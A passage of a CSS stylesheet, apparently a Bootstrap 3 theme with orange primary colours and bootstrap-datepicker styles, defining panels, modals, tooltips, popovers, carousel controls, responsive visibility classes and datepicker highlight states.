        .panel>.table-bordered>tbody>tr>th:first-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>th:first-child,
        .panel>.table-bordered>tfoot>tr>th:first-child,
        .panel>.table-responsive>.table-bordered>tfoot>tr>th:first-child,
        .panel>.table-bordered>thead>tr>td:first-child,
        .panel>.table-responsive>.table-bordered>thead>tr>td:first-child,
        .panel>.table-bordered>tbody>tr>td:first-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>td:first-child,
        .panel>.table-bordered>tfoot>tr>td:first-child,
        .panel>.table-responsive>.table-bordered>tfoot>tr>td:first-child {
            border-left: 0;
        }

        .panel>.table-bordered>thead>tr>th:last-child,
        .panel>.table-responsive>.table-bordered>thead>tr>th:last-child,
        .panel>.table-bordered>tbody>tr>th:last-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>th:last-child,
        .panel>.table-bordered>tfoot>tr>th:last-child,
        .panel>.table-responsive>.table-bordered>tfoot>tr>th:last-child,
        .panel>.table-bordered>thead>tr>td:last-child,
        .panel>.table-responsive>.table-bordered>thead>tr>td:last-child,
        .panel>.table-bordered>tbody>tr>td:last-child,
        .panel>.table-responsive>.table-bordered>tbody>tr>td:last-child,
        .panel>.table-bordered>tfoot>tr>td:last-child,
        .panel>.table-responsive>.table-bordered>tfoot>tr>td:last-child {
            border-right: 0;
        }

        .panel>.table-bordered>thead>tr:first-child>td,
        .panel>.table-responsive>.table-bordered>thead>tr:first-child>td,
        .panel>.table-bordered>tbody>tr:first-child>td,
        .panel>.table-responsive>.table-bordered>tbody>tr:first-child>td,
        .panel>.table-bordered>thead>tr:first-child>th,
        .panel>.table-responsive>.table-bordered>thead>tr:first-child>th,
        .panel>.table-bordered>tbody>tr:first-child>th,
        .panel>.table-responsive>.table-bordered>tbody>tr:first-child>th {
            border-bottom: 0;
        }

        .panel>.table-bordered>tbody>tr:last-child>td,
        .panel>.table-responsive>.table-bordered>tbody>tr:last-child>td,
        .panel>.table-bordered>tfoot>tr:last-child>td,
        .panel>.table-responsive>.table-bordered>tfoot>tr:last-child>td,
        .panel>.table-bordered>tbody>tr:last-child>th,
        .panel>.table-responsive>.table-bordered>tbody>tr:last-child>th,
        .panel>.table-bordered>tfoot>tr:last-child>th,
        .panel>.table-responsive>.table-bordered>tfoot>tr:last-child>th {
            border-bottom: 0;
        }

        .panel>.table-responsive {
            margin-bottom: 0;
            border: 0;
        }

        .panel-group {
            margin-bottom: 20px;
        }

        .panel-group .panel {
            margin-bottom: 0;
            border-radius: 3px;
        }

        .panel-group .panel+.panel {
            margin-top: 5px;
        }

        .panel-group .panel-heading {
            border-bottom: 0;
        }

        .panel-group .panel-heading+.panel-collapse>.panel-body,
        .panel-group .panel-heading+.panel-collapse>.list-group {
            border-top: 1px solid #ddd;
        }

        .panel-group .panel-footer {
            border-top: 0;
        }

        .panel-group .panel-footer+.panel-collapse .panel-body {
            border-bottom: 1px solid #ddd;
        }

        .panel-default {
            border-color: #ddd;
        }

        .panel-default>.panel-heading {
            color: #333;
            background-color: #f5f5f5;
            border-color: #ddd;
        }

        .panel-default>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #ddd;
        }

        .panel-default>.panel-heading .badge {
            color: #f5f5f5;
            background-color: #333;
        }

        .panel-default>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #ddd;
        }

        .panel-primary {
            border-color: #f80;
        }

        .panel-primary>.panel-heading {
            color: #fff;
            background-color: #f80;
            border-color: #f80;
        }

        .panel-primary>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #f80;
        }

        .panel-primary>.panel-heading .badge {
            color: #f80;
            background-color: #fff;
        }

        .panel-primary>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #f80;
        }

        .panel-success {
            border-color: #d6e9c6;
        }

        .panel-success>.panel-heading {
            color: #3c763d;
            background-color: #dff0d8;
            border-color: #d6e9c6;
        }

        .panel-success>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #d6e9c6;
        }

        .panel-success>.panel-heading .badge {
            color: #dff0d8;
            background-color: #3c763d;
        }

        .panel-success>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #d6e9c6;
        }

        .panel-info {
            border-color: #bce8f1;
        }

        .panel-info>.panel-heading {
            color: #31708f;
            background-color: #d9edf7;
            border-color: #bce8f1;
        }

        .panel-info>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #bce8f1;
        }

        .panel-info>.panel-heading .badge {
            color: #d9edf7;
            background-color: #31708f;
        }

        .panel-info>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #bce8f1;
        }

        .panel-warning {
            border-color: #faebcc;
        }

        .panel-warning>.panel-heading {
            color: #8a6d3b;
            background-color: #fcf8e3;
            border-color: #faebcc;
        }

        .panel-warning>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #faebcc;
        }

        .panel-warning>.panel-heading .badge {
            color: #fcf8e3;
            background-color: #8a6d3b;
        }

        .panel-warning>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #faebcc;
        }

        .panel-danger {
            border-color: #ebccd1;
        }

        .panel-danger>.panel-heading {
            color: #a94442;
            background-color: #f2dede;
            border-color: #ebccd1;
        }

        .panel-danger>.panel-heading+.panel-collapse>.panel-body {
            border-top-color: #ebccd1;
        }

        .panel-danger>.panel-heading .badge {
            color: #f2dede;
            background-color: #a94442;
        }

        .panel-danger>.panel-footer+.panel-collapse>.panel-body {
            border-bottom-color: #ebccd1;
        }

        .embed-responsive {
            position: relative;
            display: block;
            height: 0;
            padding: 0;
            overflow: hidden;
        }

        .embed-responsive .embed-responsive-item,
        .embed-responsive iframe,
        .embed-responsive embed,
        .embed-responsive object,
        .embed-responsive video {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }

        .embed-responsive-16by9 {
            padding-bottom: 56.25%;
        }

        .embed-responsive-4by3 {
            padding-bottom: 75%;
        }

        .well {
            min-height: 20px;
            padding: 19px;
            margin-bottom: 20px;
            background-color: #f5f5f5;
            border: 1px solid #e3e3e3;
            border-radius: 3px;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.05);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.05);
        }

        .well blockquote {
            border-color: #ddd;
            border-color: rgba(0, 0, 0, 0.15);
        }

        .well-lg {
            padding: 24px;
            border-radius: 3px;
        }

        .well-sm {
            padding: 9px;
            border-radius: 3px;
        }

        .close {
            float: right;
            font-size: 21px;
            font-weight: bold;
            line-height: 1;
            color: #000;
            text-shadow: 0 1px 0 #fff;
            filter: alpha(opacity=20);
            opacity: 0.2;
        }

        .close:hover,
        .close:focus {
            color: #000;
            text-decoration: none;
            cursor: pointer;
            filter: alpha(opacity=50);
            opacity: 0.5;
        }

        button.close {
            padding: 0;
            cursor: pointer;
            background: transparent;
            border: 0;
            -webkit-appearance: none;
            appearance: none;
        }

        .modal-open {
            overflow: hidden;
        }

        .modal {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1050;
            display: none;
            overflow: hidden;
            -webkit-overflow-scrolling: touch;
            outline: 0;
        }

        .modal.fade .modal-dialog {
            -webkit-transform: translate(0, -25%);
            -ms-transform: translate(0, -25%);
            -o-transform: translate(0, -25%);
            transform: translate(0, -25%);
            -webkit-transition: -webkit-transform 0.3s ease-out;
            -moz-transition: -moz-transform 0.3s ease-out;
            -o-transition: -o-transform 0.3s ease-out;
            transition: transform 0.3s ease-out;
        }

        .modal.in .modal-dialog {
            -webkit-transform: translate(0, 0);
            -ms-transform: translate(0, 0);
            -o-transform: translate(0, 0);
            transform: translate(0, 0);
        }

        .modal-open .modal {
            overflow-x: hidden;
            overflow-y: auto;
        }

        .modal-dialog {
            position: relative;
            width: auto;
            margin: 10px;
        }

        .modal-content {
            position: relative;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #999;
            border: 1px solid rgba(0, 0, 0, 0.2);
            border-radius: 3px;
            -webkit-box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
            box-shadow: 0 3px 9px rgba(0, 0, 0, 0.5);
            outline: 0;
        }

        .modal-backdrop {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 1040;
            background-color: #000;
        }

        .modal-backdrop.fade {
            filter: alpha(opacity=0);
            opacity: 0;
        }

        .modal-backdrop.in {
            filter: alpha(opacity=50);
            opacity: 0.5;
        }

        .modal-header {
            padding: 15px;
            border-bottom: 1px solid #e5e5e5;
        }

        .modal-header .close {
            margin-top: -2px;
        }

        .modal-title {
            margin: 0;
            line-height: 1.42857143;
        }

        .modal-body {
            position: relative;
            padding: 13px;
        }

        .modal-footer {
            padding: 13px;
            text-align: right;
            border-top: 1px solid #e5e5e5;
        }

        .modal-footer .btn+.btn {
            margin-bottom: 0;
            margin-left: 5px;
        }

        .modal-footer .btn-group .btn+.btn {
            margin-left: -1px;
        }

        .modal-footer .btn-block+.btn-block {
            margin-left: 0;
        }

        .modal-scrollbar-measure {
            position: absolute;
            top: -9999px;
            width: 50px;
            height: 50px;
            overflow: scroll;
        }

        @media (min-width: 768px) {
            .modal-dialog {
                width: 600px;
                margin: 30px auto;
            }

            .modal-content {
                -webkit-box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
            }

            .modal-sm {
                width: 300px;
            }
        }

        @media (min-width: 992px) {
            .modal-lg {
                width: 900px;
            }
        }

        .tooltip {
            position: absolute;
            z-index: 1070;
            display: block;
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-style: normal;
            font-weight: 400;
            line-height: 1.42857143;
            line-break: auto;
            text-align: left;
            text-align: start;
            text-decoration: none;
            text-shadow: none;
            text-transform: none;
            letter-spacing: normal;
            word-break: normal;
            word-spacing: normal;
            word-wrap: normal;
            white-space: normal;
            font-size: 12px;
            filter: alpha(opacity=0);
            opacity: 0;
        }

        .tooltip.in {
            filter: alpha(opacity=90);
            opacity: 0.9;
        }

        .tooltip.top {
            padding: 5px 0;
            margin-top: -3px;
        }

        .tooltip.right {
            padding: 0 5px;
            margin-left: 3px;
        }

        .tooltip.bottom {
            padding: 5px 0;
            margin-top: 3px;
        }

        .tooltip.left {
            padding: 0 5px;
            margin-left: -3px;
        }

        .tooltip.top .tooltip-arrow {
            bottom: 0;
            left: 50%;
            margin-left: -5px;
            border-width: 5px 5px 0;
            border-top-color: #000;
        }

        .tooltip.top-left .tooltip-arrow {
            right: 5px;
            bottom: 0;
            margin-bottom: -5px;
            border-width: 5px 5px 0;
            border-top-color: #000;
        }

        .tooltip.top-right .tooltip-arrow {
            bottom: 0;
            left: 5px;
            margin-bottom: -5px;
            border-width: 5px 5px 0;
            border-top-color: #000;
        }

        .tooltip.right .tooltip-arrow {
            top: 50%;
            left: 0;
            margin-top: -5px;
            border-width: 5px 5px 5px 0;
            border-right-color: #000;
        }

        .tooltip.left .tooltip-arrow {
            top: 50%;
            right: 0;
            margin-top: -5px;
            border-width: 5px 0 5px 5px;
            border-left-color: #000;
        }

        .tooltip.bottom .tooltip-arrow {
            top: 0;
            left: 50%;
            margin-left: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #000;
        }

        .tooltip.bottom-left .tooltip-arrow {
            top: 0;
            right: 5px;
            margin-top: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #000;
        }

        .tooltip.bottom-right .tooltip-arrow {
            top: 0;
            left: 5px;
            margin-top: -5px;
            border-width: 0 5px 5px;
            border-bottom-color: #000;
        }

        .tooltip-inner {
            max-width: 200px;
            padding: 3px 8px;
            color: #fff;
            text-align: center;
            background-color: #000;
            border-radius: 3px;
        }

        .tooltip-arrow {
            position: absolute;
            width: 0;
            height: 0;
            border-color: transparent;
            border-style: solid;
        }

        .popover {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1060;
            display: none;
            max-width: 276px;
            padding: 1px;
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-style: normal;
            font-weight: 400;
            line-height: 1.42857143;
            line-break: auto;
            text-align: left;
            text-align: start;
            text-decoration: none;
            text-shadow: none;
            text-transform: none;
            letter-spacing: normal;
            word-break: normal;
            word-spacing: normal;
            word-wrap: normal;
            white-space: normal;
            font-size: 14px;
            background-color: #fff;
            background-clip: padding-box;
            border: 1px solid #ccc;
            border: 1px solid rgba(0, 0, 0, 0.2);
            border-radius: 3px;
            -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
        }

        .popover.top {
            margin-top: -10px;
        }

        .popover.right {
            margin-left: 10px;
        }

        .popover.bottom {
            margin-top: 10px;
        }

        .popover.left {
            margin-left: -10px;
        }

        .popover>.arrow {
            border-width: 11px;
        }

        .popover>.arrow,
        .popover>.arrow:after {
            position: absolute;
            display: block;
            width: 0;
            height: 0;
            border-color: transparent;
            border-style: solid;
        }

        .popover>.arrow:after {
            content: "";
            border-width: 10px;
        }

        .popover.top>.arrow {
            bottom: -11px;
            left: 50%;
            margin-left: -11px;
            border-top-color: #999;
            border-top-color: rgba(0, 0, 0, 0.25);
            border-bottom-width: 0;
        }

        .popover.top>.arrow:after {
            bottom: 1px;
            margin-left: -10px;
            content: " ";
            border-top-color: #fff;
            border-bottom-width: 0;
        }

        .popover.right>.arrow {
            top: 50%;
            left: -11px;
            margin-top: -11px;
            border-right-color: #999;
            border-right-color: rgba(0, 0, 0, 0.25);
            border-left-width: 0;
        }

        .popover.right>.arrow:after {
            bottom: -10px;
            left: 1px;
            content: " ";
            border-right-color: #fff;
            border-left-width: 0;
        }

        .popover.bottom>.arrow {
            top: -11px;
            left: 50%;
            margin-left: -11px;
            border-top-width: 0;
            border-bottom-color: #999;
            border-bottom-color: rgba(0, 0, 0, 0.25);
        }

        .popover.bottom>.arrow:after {
            top: 1px;
            margin-left: -10px;
            content: " ";
            border-top-width: 0;
            border-bottom-color: #fff;
        }

        .popover.left>.arrow {
            top: 50%;
            right: -11px;
            margin-top: -11px;
            border-right-width: 0;
            border-left-color: #999;
            border-left-color: rgba(0, 0, 0, 0.25);
        }

        .popover.left>.arrow:after {
            right: 1px;
            bottom: -10px;
            content: " ";
            border-right-width: 0;
            border-left-color: #fff;
        }

        .popover-title {
            padding: 8px 14px;
            margin: 0;
            font-size: 14px;
            background-color: #f7f7f7;
            border-bottom: 1px solid #ebebeb;
            border-radius: 2px 2px 0 0;
        }

        .popover-content {
            padding: 9px 14px;
        }

        .carousel {
            position: relative;
        }

        .carousel-inner {
            position: relative;
            width: 100%;
            overflow: hidden;
        }

        .carousel-inner>.item {
            position: relative;
            display: none;
            -webkit-transition: 0.6s ease-in-out left;
            -o-transition: 0.6s ease-in-out left;
            transition: 0.6s ease-in-out left;
        }

        .carousel-inner>.item>img,
        .carousel-inner>.item>a>img {
            line-height: 1;
        }

        @media all and (transform-3d),
        (-webkit-transform-3d) {
            .carousel-inner>.item {
                -webkit-transition: -webkit-transform 0.6s ease-in-out;
                -moz-transition: -moz-transform 0.6s ease-in-out;
                -o-transition: -o-transform 0.6s ease-in-out;
                transition: transform 0.6s ease-in-out;
                -webkit-backface-visibility: hidden;
                -moz-backface-visibility: hidden;
                backface-visibility: hidden;
                -webkit-perspective: 1000px;
                -moz-perspective: 1000px;
                perspective: 1000px;
            }

            .touch .carousel-inner>.item {
                backface-visibility: hidden;
                -webkit-backface-visibility: hidden;
                -moz-backface-visibility: hidden;
            }

            .carousel-inner>.item.next,
            .carousel-inner>.item.active.right {
                -webkit-transform: translate3d(100%, 0, 0);
                transform: translate3d(100%, 0, 0);
                left: 0;
            }

            .carousel-inner>.item.prev,
            .carousel-inner>.item.active.left {
                -webkit-transform: translate3d(-100%, 0, 0);
                transform: translate3d(-100%, 0, 0);
                left: 0;
            }

            .carousel-inner>.item.next.left,
            .carousel-inner>.item.prev.right,
            .carousel-inner>.item.active {
                -webkit-transform: translate3d(0, 0, 0);
                transform: translate3d(0, 0, 0);
                left: 0;
            }
        }

        .carousel-inner>.active,
        .carousel-inner>.next,
        .carousel-inner>.prev {
            display: block;
        }

        .carousel-inner>.active {
            left: 0;
        }

        .carousel-inner>.next,
        .carousel-inner>.prev {
            position: absolute;
            top: 0;
            width: 100%;
        }

        .carousel-inner>.next {
            left: 100%;
        }

        .carousel-inner>.prev {
            left: -100%;
        }

        .carousel-inner>.next.left,
        .carousel-inner>.prev.right {
            left: 0;
        }

        .carousel-inner>.active.left {
            left: -100%;
        }

        .carousel-inner>.active.right {
            left: 100%;
        }

        .carousel-control {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            width: 15%;
            font-size: 20px;
            color: #fff;
            text-align: center;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
            background-color: rgba(0, 0, 0, 0);
            filter: alpha(opacity=50);
            opacity: 0.5;
        }

        .carousel-control.left {
            background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.5) 0, rgba(0, 0, 0, 0.0001) 100%);
            background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.5) 0, rgba(0, 0, 0, 0.0001) 100%);
            background-image: linear-gradient(to right, rgba(0, 0, 0, 0.5) 0, rgba(0, 0, 0, 0.0001) 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1);
            background-repeat: repeat-x;
        }

        .carousel-control.right {
            right: 0;
            left: auto;
            background-image: -webkit-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0, rgba(0, 0, 0, 0.5) 100%);
            background-image: -o-linear-gradient(left, rgba(0, 0, 0, 0.0001) 0, rgba(0, 0, 0, 0.5) 100%);
            background-image: linear-gradient(to right, rgba(0, 0, 0, 0.0001) 0, rgba(0, 0, 0, 0.5) 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1);
            background-repeat: repeat-x;
        }

        .carousel-control:hover,
        .carousel-control:focus {
            color: #fff;
            text-decoration: none;
            outline: 0;
            filter: alpha(opacity=90);
            opacity: 0.9;
        }

        .carousel-control .icon-prev,
        .carousel-control .icon-next,
        .carousel-control .glyphicon-chevron-left,
        .carousel-control .glyphicon-chevron-right {
            position: absolute;
            top: 50%;
            z-index: 5;
            display: inline-block;
            margin-top: -10px;
        }

        .carousel-control .icon-prev,
        .carousel-control .glyphicon-chevron-left {
            left: 50%;
            margin-left: -10px;
        }

        .carousel-control .icon-next,
        .carousel-control .glyphicon-chevron-right {
            right: 50%;
            margin-right: -10px;
        }

        .carousel-control .icon-prev,
        .carousel-control .icon-next {
            width: 20px;
            height: 20px;
            font-family: serif;
            line-height: 1;
        }

        .carousel-control .icon-prev:before {
            content: "\2039";
        }

        .carousel-control .icon-next:before {
            content: "\203a";
        }

        .carousel-indicators {
            position: absolute;
            bottom: 10px;
            left: 50%;
            z-index: 15;
            width: 60%;
            padding-left: 0;
            margin-left: -30%;
            text-align: center;
            list-style: none;
        }

        .carousel-indicators li {
            display: inline-block;
            width: 10px;
            height: 10px;
            margin: 1px;
            text-indent: -999px;
            cursor: pointer;
            background-color: #000 \9;
            background-color: rgba(0, 0, 0, 0);
            border: 1px solid #fff;
            border-radius: 10px;
        }

        .carousel-indicators .active {
            width: 12px;
            height: 12px;
            margin: 0;
            background-color: #fff;
        }

        .carousel-caption {
            position: absolute;
            right: 15%;
            bottom: 20px;
            left: 15%;
            z-index: 10;
            padding-top: 20px;
            padding-bottom: 20px;
            color: #fff;
            text-align: center;
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.6);
        }

        .carousel-caption .btn {
            text-shadow: none;
        }

        @media screen and (min-width: 768px) {

            .carousel-control .glyphicon-chevron-left,
            .carousel-control .glyphicon-chevron-right,
            .carousel-control .icon-prev,
            .carousel-control .icon-next {
                width: 30px;
                height: 30px;
                margin-top: -10px;
                font-size: 30px;
            }

            .carousel-control .glyphicon-chevron-left,
            .carousel-control .icon-prev {
                margin-left: -10px;
            }

            .carousel-control .glyphicon-chevron-right,
            .carousel-control .icon-next {
                margin-right: -10px;
            }

            .carousel-caption {
                right: 20%;
                left: 20%;
                padding-bottom: 30px;
            }

            .carousel-indicators {
                bottom: 20px;
            }
        }

        .clearfix:before,
        .clearfix:after,
        .dl-horizontal dd:before,
        .dl-horizontal dd:after,
        .container:before,
        .container:after,
        .container-fluid:before,
        .container-fluid:after,
        .row:before,
        .row:after,
        .form-horizontal .form-group:before,
        .form-horizontal .form-group:after,
        .btn-toolbar:before,
        .btn-toolbar:after,
        .btn-group-vertical>.btn-group:before,
        .btn-group-vertical>.btn-group:after,
        .nav:before,
        .nav:after,
        .navbar:before,
        .navbar:after,
        .navbar-header:before,
        .navbar-header:after,
        .navbar-collapse:before,
        .navbar-collapse:after,
        .pager:before,
        .pager:after,
        .panel-body:before,
        .panel-body:after,
        .modal-header:before,
        .modal-header:after,
        .modal-footer:before,
        .modal-footer:after {
            display: table;
            content: " ";
        }

        .clearfix:after,
        .dl-horizontal dd:after,
        .container:after,
        .container-fluid:after,
        .row:after,
        .form-horizontal .form-group:after,
        .btn-toolbar:after,
        .btn-group-vertical>.btn-group:after,
        .nav:after,
        .navbar:after,
        .navbar-header:after,
        .navbar-collapse:after,
        .pager:after,
        .panel-body:after,
        .modal-header:after,
        .modal-footer:after {
            clear: both;
        }

        .center-block {
            display: block;
            margin-right: auto;
            margin-left: auto;
        }

        .pull-right {
            float: right !important;
        }

        .pull-left {
            float: left !important;
        }

        .hide {
            display: none !important;
        }

        .show {
            display: block !important;
        }

        .invisible {
            visibility: hidden;
        }

        .text-hide {
            font: 0/0 a;
            color: transparent;
            text-shadow: none;
            background-color: transparent;
            border: 0;
        }

        .hidden {
            display: none !important;
        }

        .affix {
            position: fixed;
        }

        @-ms-viewport {
            width: device-width;
        }

        .visible-xs,
        .visible-sm,
        .visible-md,
        .visible-lg {
            display: none !important;
        }

        .visible-xs-block,
        .visible-xs-inline,
        .visible-xs-inline-block,
        .visible-sm-block,
        .visible-sm-inline,
        .visible-sm-inline-block,
        .visible-md-block,
        .visible-md-inline,
        .visible-md-inline-block,
        .visible-lg-block,
        .visible-lg-inline,
        .visible-lg-inline-block {
            display: none !important;
        }

        @media (max-width: 767px) {
            .visible-xs {
                display: block !important;
            }

            table.visible-xs {
                display: table !important;
            }

            tr.visible-xs {
                display: table-row !important;
            }

            th.visible-xs,
            td.visible-xs {
                display: table-cell !important;
            }
        }

        @media (max-width: 767px) {
            .visible-xs-block {
                display: block !important;
            }
        }

        @media (max-width: 767px) {
            .visible-xs-inline {
                display: inline !important;
            }
        }

        @media (max-width: 767px) {
            .visible-xs-inline-block {
                display: inline-block !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm {
                display: block !important;
            }

            table.visible-sm {
                display: table !important;
            }

            tr.visible-sm {
                display: table-row !important;
            }

            th.visible-sm,
            td.visible-sm {
                display: table-cell !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm-block {
                display: block !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm-inline {
                display: inline !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .visible-sm-inline-block {
                display: inline-block !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md {
                display: block !important;
            }

            table.visible-md {
                display: table !important;
            }

            tr.visible-md {
                display: table-row !important;
            }

            th.visible-md,
            td.visible-md {
                display: table-cell !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md-block {
                display: block !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md-inline {
                display: inline !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .visible-md-inline-block {
                display: inline-block !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg {
                display: block !important;
            }

            table.visible-lg {
                display: table !important;
            }

            tr.visible-lg {
                display: table-row !important;
            }

            th.visible-lg,
            td.visible-lg {
                display: table-cell !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg-block {
                display: block !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg-inline {
                display: inline !important;
            }
        }

        @media (min-width: 1200px) {
            .visible-lg-inline-block {
                display: inline-block !important;
            }
        }

        @media (max-width: 767px) {
            .hidden-xs {
                display: none !important;
            }
        }

        @media (min-width: 768px) and (max-width: 991px) {
            .hidden-sm {
                display: none !important;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px) {
            .hidden-md {
                display: none !important;
            }
        }

        @media (min-width: 1200px) {
            .hidden-lg {
                display: none !important;
            }
        }

        .visible-print {
            display: none !important;
        }

        @media print {
            .visible-print {
                display: block !important;
            }

            table.visible-print {
                display: table !important;
            }

            tr.visible-print {
                display: table-row !important;
            }

            th.visible-print,
            td.visible-print {
                display: table-cell !important;
            }
        }

        .visible-print-block {
            display: none !important;
        }

        @media print {
            .visible-print-block {
                display: block !important;
            }
        }

        .visible-print-inline {
            display: none !important;
        }

        @media print {
            .visible-print-inline {
                display: inline !important;
            }
        }

        .visible-print-inline-block {
            display: none !important;
        }

        @media print {
            .visible-print-inline-block {
                display: inline-block !important;
            }
        }

        @media print {
            .hidden-print {
                display: none !important;
            }
        }

        .datepicker {
            padding: 4px;
            border-radius: 4px;
            direction: ltr;
        }

        .datepicker-inline {
            width: 220px;
        }

        .datepicker.datepicker-rtl {
            direction: rtl;
        }

        .datepicker.datepicker-rtl table tr td span {
            float: right;
        }

        .datepicker-dropdown {
            top: 0;
            left: 0;
        }

        .datepicker-dropdown:before {
            content: "";
            display: inline-block;
            border-left: 7px solid transparent;
            border-right: 7px solid transparent;
            border-bottom: 7px solid #ccc;
            border-top: 0;
            border-bottom-color: rgba(0, 0, 0, 0.2);
            position: absolute;
        }

        .datepicker-dropdown:after {
            content: "";
            display: inline-block;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-bottom: 6px solid #fff;
            border-top: 0;
            position: absolute;
        }

        .datepicker-dropdown.datepicker-orient-left:before {
            left: 6px;
        }

        .datepicker-dropdown.datepicker-orient-left:after {
            left: 7px;
        }

        .datepicker-dropdown.datepicker-orient-right:before {
            right: 6px;
        }

        .datepicker-dropdown.datepicker-orient-right:after {
            right: 7px;
        }

        .datepicker-dropdown.datepicker-orient-top:before {
            top: -7px;
        }

        .datepicker-dropdown.datepicker-orient-top:after {
            top: -6px;
        }

        .datepicker-dropdown.datepicker-orient-bottom:before {
            bottom: -7px;
            border-bottom: 0;
            border-top: 7px solid #999;
        }

        .datepicker-dropdown.datepicker-orient-bottom:after {
            bottom: -6px;
            border-bottom: 0;
            border-top: 6px solid #fff;
        }

        .datepicker>div {
            display: none;
        }

        .datepicker.days div.datepicker-days {
            display: block;
        }

        .datepicker.months div.datepicker-months {
            display: block;
        }

        .datepicker.years div.datepicker-years {
            display: block;
        }

        .datepicker table {
            margin: 0;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .datepicker table tr td,
        .datepicker table tr th {
            text-align: center;
            width: 30px;
            height: 30px;
            border-radius: 4px;
            border: none;
        }

        .table-striped .datepicker table tr td,
        .table-striped .datepicker table tr th {
            background-color: transparent;
        }

        .datepicker table tr td.day:hover,
        .datepicker table tr td.day.focused {
            background: #eee;
            cursor: pointer;
        }

        .datepicker table tr td.old,
        .datepicker table tr td.new {
            color: #777;
        }

        .datepicker table tr td.disabled,
        .datepicker table tr td.disabled:hover {
            background: none;
            color: #777;
            cursor: default;
        }

        .datepicker table tr td.today,
        .datepicker table tr td.today:hover,
        .datepicker table tr td.today.disabled,
        .datepicker table tr td.today.disabled:hover {
            color: #000;
            background-color: #ffdb99;
            border-color: #ffb733;
        }

        .datepicker table tr td.today:focus,
        .datepicker table tr td.today:hover:focus,
        .datepicker table tr td.today.disabled:focus,
        .datepicker table tr td.today.disabled:hover:focus,
        .datepicker table tr td.today.focus,
        .datepicker table tr td.today:hover.focus,
        .datepicker table tr td.today.disabled.focus,
        .datepicker table tr td.today.disabled:hover.focus {
            color: #000;
            background-color: #ffc966;
            border-color: #b37400;
        }

        .datepicker table tr td.today:hover,
        .datepicker table tr td.today:hover:hover,
        .datepicker table tr td.today.disabled:hover,
        .datepicker table tr td.today.disabled:hover:hover {
            color: #000;
            background-color: #ffc966;
            border-color: #f59e00;
        }

        .datepicker table tr td.today:active,
        .datepicker table tr td.today:hover:active,
        .datepicker table tr td.today.disabled:active,
        .datepicker table tr td.today.disabled:hover:active,
        .datepicker table tr td.today.active,
        .datepicker table tr td.today:hover.active,
        .datepicker table tr td.today.disabled.active,
        .datepicker table tr td.today.disabled:hover.active,
        .open>.dropdown-toggle.datepicker table tr td.today,
        .open>.dropdown-toggle.datepicker table tr td.today:hover,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled,
        .open>.dropdown-toggle.datepicker table tr td.today.disabled:hover {
            color: #000;
            background-color: #ffc966;
            background-image: none;
            border-color: #f59e00;
        }

        .datepicker table tr td.today:active:hover,
        .datepicker table tr td.today:hover:active:hover,
        .datepicker table tr td.today.disabled:active:hover,
        .datepicker table tr td.today.disabled:hover:active:hover,
        .datepicker table tr td.today.active:hover,
        .datepicker table tr td.today:hover.active:hover,
        .datepicker table tr td.today.disabled.active:hover,
        .datepicker table tr td.today.disabled:hover.active:hover,
